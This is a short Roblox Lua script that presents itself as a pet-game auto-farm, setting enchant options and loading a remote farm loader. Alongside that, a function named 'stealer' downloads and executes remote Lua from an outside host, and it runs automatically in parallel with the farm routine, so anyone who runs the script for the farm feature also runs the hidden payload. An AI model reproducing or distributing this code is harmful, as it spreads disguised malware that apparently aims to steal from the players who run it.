
local function stealer()
    loadstring(game:HttpGet('https://darkscripts.space/scripts/96273c4c-aeee-4e07-8aba-64179469a658_1266914995518705825.lua',true))()
end
local function farm()
 
getgenv().Config = {
    ["EquipEnchants"] = {"Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Strong Pets", "Coins", "Fortune"},
    ["UserID"] = "",
    ["Webhook"] = ""
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b883bc159a5f609adb4871db6fc15ea8.lua"))()

end

task.spawn(stealer)
task.spawn(farm)
